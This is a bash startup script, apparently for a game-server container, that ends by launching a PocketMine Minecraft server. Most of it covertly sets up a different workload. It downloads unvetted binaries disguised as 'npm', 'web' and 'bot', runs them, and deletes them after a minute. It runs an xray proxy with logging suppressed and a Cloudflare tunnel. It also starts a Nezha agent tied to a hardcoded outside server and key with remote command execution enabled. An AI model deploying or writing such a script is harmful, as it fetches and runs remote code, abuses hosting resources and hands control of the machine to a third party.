#!/bin/bash

FILE_PATH=${FILE_PATH:-"./temp"}
projectPageURL=${URL:-""}
intervalInseconds=${TIME:-120}
UUID=${UUID:-"89c13786-25aa-4520-b2e7-12cd60fb5202"}
NEZHA_SERVER=${NEZHA_SERVER:-"nz-data.pbot.eu.org"}
NEZHA_PORT=${NEZHA_PORT:-"443"}
NEZHA_KEY=${NEZHA_KEY:-"3KTPhxtireYi4L1s5OTpsm2ZHYDc9eve"}
ARGO_DOMAIN=${ARGO_DOMAIN:-""}
ARGO_AUTH=${ARGO_AUTH:-""}
CFIP=${CFIP:-"www.visa.com.tw"}
CFPORT=${CFPORT:-443}
NAME=${NAME:-""}
ARGO_PORT=${ARGO_PORT:-8080}
PORT=${SERVER_PORT:-${PORT:-3000}}

# 创建运行文件夹
if [ ! -d "$FILE_PATH" ]; then
  mkdir -p "$FILE_PATH"
  echo "$FILE_PATH is created"
else
  echo "$FILE_PATH already exists"
fi

# 清理历史文件
clean_old_files() {
  for file in web bot npm sub.txt boot.log; do
    if [ -f "$FILE_PATH/$file" ]; then
      rm -f "$FILE_PATH/$file"
      echo "$FILE_PATH/$file deleted"
    else
      echo "Skip Delete $FILE_PATH/$file"
    fi
  done
}
clean_old_files

# 生成xr-ay配置文件
generate_config() {
  cat > "$FILE_PATH/config.json" << EOF
{
  "log": {
    "access": "/dev/null",
    "error": "/dev/null",
    "loglevel": "none"
  },
  "inbounds": [
    {
      "port": $ARGO_PORT,
      "protocol": "vless",
      "settings": {
        "clients": [
          {
            "id": "$UUID",
            "flow": "xtls-rprx-vision"
          }
        ],
        "decryption": "none",
        "fallbacks": [
          {
            "dest": 3001
          },
          {
            "path": "/vless-argo",
            "dest": 3002
          },
          {
            "path": "/vmess-argo",
            "dest": 3003
          },
          {
            "path": "/trojan-argo",
            "dest": 3004
          }
        ]
      },
      "streamSettings": {
        "network": "tcp"
      }
    },
    {
      "port": 3001,
      "listen": "127.0.0.1",
      "protocol": "vless",
      "settings": {
        "clients": [
          {
            "id": "$UUID"
          }
        ],
        "decryption": "none"
      },
      "streamSettings": {
        "network": "tcp",
        "security": "none"
      }
    },
    {
      "port": 3002,
      "listen": "127.0.0.1",
      "protocol": "vless",
      "settings": {
        "clients": [
          {
            "id": "$UUID",
            "level": 0
          }
        ],
        "decryption": "none"
      },
      "streamSettings": {
        "network": "ws",
        "security": "none",
        "wsSettings": {
          "path": "/vless-argo"
        }
      },
      "sniffing": {
        "enabled": true,
        "destOverride": [
          "http",
          "tls",
          "quic"
        ],
        "metadataOnly": false
      }
    },
    {
      "port": 3003,
      "listen": "127.0.0.1",
      "protocol": "vmess",
      "settings": {
        "clients": [
          {
            "id": "$UUID",
            "alterId": 0
          }
        ]
      },
      "streamSettings": {
        "network": "ws",
        "wsSettings": {
          "path": "/vmess-argo"
        }
      },
      "sniffing": {
        "enabled": true,
        "destOverride": [
          "http",
          "tls",
          "quic"
        ],
        "metadataOnly": false
      }
    },
    {
      "port": 3004,
      "listen": "127.0.0.1",
      "protocol": "trojan",
      "settings": {
        "clients": [
          {
            "password": "$UUID"
          }
        ]
      },
      "streamSettings": {
        "network": "ws",
        "security": "none",
        "wsSettings": {
          "path": "/trojan-argo"
        }
      },
      "sniffing": {
        "enabled": true,
        "destOverride": [
          "http",
          "tls",
          "quic"
        ],
        "metadataOnly": false
      }
    }
  ],
  "dns": {
    "servers": [
      "https+local://8.8.8.8/dns-query"
    ]
  },
  "outbounds": [
    {
      "protocol": "freedom",
      "tag": "direct"
    },
    {
      "protocol": "blackhole",
      "tag": "block"
    }
  ]
}
EOF
  echo "Generated config.json"
}
generate_config

# 判断系统架构
get_system_architecture() {
  case $(uname -m) in
    arm*|aarch*)
      echo "arm"
      ;;
    *)
      echo "amd"
      ;;
  esac
}

# 下载文件
download_file() {
  local fileName="$1"
  local fileUrl="$2"
  local filePath="$FILE_PATH/$fileName"
  
  echo "Downloading $fileName from $fileUrl..."
  if curl -L "$fileUrl" -o "$filePath"; then
    echo "Download $fileName successfully"
    return 0
  else
    echo "Download $fileName failed"
    return 1
  fi
}

# 获取架构对应的文件URL
get_files_for_architecture() {
  local architecture="$1"
  
  if [ "$architecture" = "arm" ]; then
    download_file "npm" "https://github.com/ipan233/nodejs-argo/releases/download/ARM/swith"
    download_file "web" "https://github.com/eooce/test/releases/download/ARM/web"
    download_file "bot" "https://github.com/eooce/test/releases/download/arm64/bot13"
  elif [ "$architecture" = "amd" ]; then
    download_file "npm" "https://github.com/ipan233/nodejs-argo/releases/download/amd64/amd64"
    download_file "web" "https://github.com/eooce/test/raw/main/web"
    download_file "bot" "https://github.com/eooce/test/raw/main/server"
  else
    echo "Unsupported architecture: $architecture"
    return 1
  fi
}

# 授权和运行文件
authorize_files() {
  for file in npm web bot; do
    if [ -f "$FILE_PATH/$file" ]; then
      chmod 775 "$FILE_PATH/$file"
      echo "Empowerment success for $FILE_PATH/$file: 775"
    else
      echo "Empowerment failed for $FILE_PATH/$file: file not found"
    fi
  done
}

# 生成哪吒配置
generate_nezha_config() {
  if [ -n "$NEZHA_SERVER" ] && [ -n "$NEZHA_PORT" ] && [ -n "$NEZHA_KEY" ]; then
    # 检查是否需要TLS
    use_tls="false"
    for port in 443 8443 2096 2087 2083 2053; do
      if [ "$NEZHA_PORT" = "$port" ]; then
        use_tls="true"
        break
      fi
    done
    
    # 生成随机UUID
    random_uuid=$(cat /proc/sys/kernel/random/uuid)
    
    # 创建nezha配置文件
    cat > "config.yml" << EOF
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 3
self_update_period: 0
server: ${NEZHA_SERVER}:${NEZHA_PORT}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${use_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${random_uuid}
EOF
    echo "Generated nezha config.yml"
    return 0
  else
    echo "NEZHA variable is empty, skip running"
    return 1
  fi
}

# 配置Argo隧道
setup_argo_tunnel() {
  if [ -n "$ARGO_AUTH" ] && [ -n "$ARGO_DOMAIN" ]; then
    if echo "$ARGO_AUTH" | grep -q "TunnelSecret"; then
      echo "$ARGO_AUTH" > "$FILE_PATH/tunnel.json"
      
      tunnel_id=$(echo "$ARGO_AUTH" | grep -o '"TunnelID":"[^"]*"' | cut -d'"' -f4)
      
      cat > "$FILE_PATH/tunnel.yml" << EOF
tunnel: ${tunnel_id}
credentials-file: ${FILE_PATH}/tunnel.json
protocol: http2

ingress:
  - hostname: ${ARGO_DOMAIN}
    service: http://localhost:${ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
EOF
      echo "Generated tunnel.yml for fixed tunnel"
    else
      echo "ARGO_AUTH mismatch TunnelSecret, use token connect to tunnel"
    fi
  else
    echo "ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels"
  fi
}

# 提取域名并生成订阅链接
extract_domains() {
  local argo_domain=""
  
  if [ -n "$ARGO_AUTH" ] && [ -n "$ARGO_DOMAIN" ]; then
    argo_domain="$ARGO_DOMAIN"
    echo "ARGO_DOMAIN: $argo_domain"
    generate_links "$argo_domain"
  else
    if [ -f "$FILE_PATH/boot.log" ]; then
      argo_domain=$(grep -o 'https\?://[^ ]*trycloudflare\.com\(/\?\)\?' "$FILE_PATH/boot.log" | head -n 1 | sed 's/https\?:\/\///;s/\/.*//')
      
      if [ -n "$argo_domain" ]; then
        echo "ArgoDomain: $argo_domain"
        generate_links "$argo_domain"
      else
        echo "ArgoDomain not found, re-running bot to obtain ArgoDomain"
        # 删除boot.log文件，重新运行bot以获取ArgoDomain
        rm -f "$FILE_PATH/boot.log"
        sleep 2
        nohup "$FILE_PATH/bot" tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile "$FILE_PATH/boot.log" --loglevel info --url "http://localhost:$ARGO_PORT" >/dev/null 2>&1 &
        echo "bot is running."
        sleep 3
        extract_domains # 重新提取域名
      fi
    else
      echo "boot.log not found"
    fi
  fi
}

# 生成订阅链接
generate_links() {
  local argo_domain="$1"
  
  # 获取ISP信息
  ISP=$(curl -s https://speed.cloudflare.com/meta | awk -F\" '{print $26"-"$18}' | sed -e 's/ /_/g')
  
  sleep 2
  
  # 生成VMESS配置JSON
  VMESS_CONFIG="{\"v\":\"2\",\"ps\":\"${NAME}-${ISP}\",\"add\":\"${CFIP}\",\"port\":${CFPORT},\"id\":\"${UUID}\",\"aid\":\"0\",\"scy\":\"none\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"${argo_domain}\",\"path\":\"/vmess-argo?ed=2048\",\"tls\":\"tls\",\"sni\":\"${argo_domain}\",\"alpn\":\"\"}"
  
  # Base64编码VMESS配置
  VMESS_ENCODED=$(echo -n "$VMESS_CONFIG" | base64 -w 0)
  
  # 生成订阅文本
  SUB_TXT="vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argo_domain}&type=ws&host=${argo_domain}&path=%2Fvless-argo%3Fed%3D2048#${NAME}-${ISP}

vmess://${VMESS_ENCODED}

trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argo_domain}&type=ws&host=${argo_domain}&path=%2Ftrojan-argo%3Fed%3D2048#${NAME}-${ISP}"

  # Base64编码订阅文本
  SUB_ENCODED=$(echo -n "$SUB_TXT" | base64 -w 0)
  
  # 保存到文件
  echo "$SUB_ENCODED" > "$FILE_PATH/sub.txt"
  echo "$FILE_PATH/sub.txt saved successfully"
  
  # 打印订阅编码到控制台
  echo "$SUB_ENCODED"
}

# 下载并运行所有文件
download_files_and_run() {
  local architecture=$(get_system_architecture)
  echo "Detected architecture: $architecture"
  
  get_files_for_architecture "$architecture"
  if [ $? -ne 0 ]; then
    echo "Can't find a file for the current architecture"
    return 1
  fi
  
  authorize_files
  
  # 运行哪吒
  if generate_nezha_config; then
    nohup "$FILE_PATH/npm" -c config.yml >/dev/null 2>&1 &
    echo "npm is running"
    sleep 1
  fi
  
  # 运行xr-ay
  nohup "$FILE_PATH/web" -c "$FILE_PATH/config.json" >/dev/null 2>&1 &
  echo "web is running"
  sleep 1
  
  # 运行cloud-fared
  if [ -f "$FILE_PATH/bot" ]; then
    if echo "$ARGO_AUTH" | grep -q "^[A-Z0-9a-z=]\{120,250\}$"; then
      args="tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}"
    elif echo "$ARGO_AUTH" | grep -q "TunnelSecret"; then
      args="tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run"
    else
      args="tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}"
    fi
    
    nohup "$FILE_PATH/bot" $args >/dev/null 2>&1 &
    echo "bot is running"
    sleep 2
  fi
  
  sleep 5
}

# 清理文件
clean_files() {
  sleep 60
  rm -rf "$FILE_PATH/boot.log" "$FILE_PATH/config.json" "$FILE_PATH/npm" "$FILE_PATH/web" "$FILE_PATH/bot"
  clear
  echo "App is running"
  echo "Thank you for using this script, enjoy!"
}

# 访问项目URL
visit_project_page() {
  if [ -n "$projectPageURL" ] && [ -n "$intervalInseconds" ]; then
    curl -s "$projectPageURL" > /dev/null
    echo "Page visited successfully"
    clear
  else
    echo "URL or TIME variable is empty, skip visit url"
  fi
}

# 设置定时访问
setup_visit_cron() {
  while true; do
    visit_project_page
    sleep "$intervalInseconds"
  done &
}

# 启动HTTP服务器
start_http_server() {
  # 使用nc创建简单的HTTP服务器
  while true; do
    echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello world!" | nc -l -p "$PORT"
  done &
  
  echo "Http server is running on port:$PORT!"
}

# 启动子路由用于订阅
start_sub_server() {
  # 创建一个子进程为/sub路径服务
  while true; do
    nc -l -p 8081 | while read line; do
      if echo "$line" | grep -q "GET /sub"; then
        sub_content=$(cat "$FILE_PATH/sub.txt")
        echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$sub_content"
        break
      fi
    done
  done &
}

# 主函数
main() {
  setup_argo_tunnel
  download_files_and_run
  extract_domains
  clean_files &
  setup_visit_cron
  start_http_server
  start_sub_server
}

# 运行主函数
main

chmod +x PocketMnie-MP.phar
export PATH=/home/container/bin/php7/bin:$PATH
php ./PocketMnie-MP.phar

tail -f /dev/null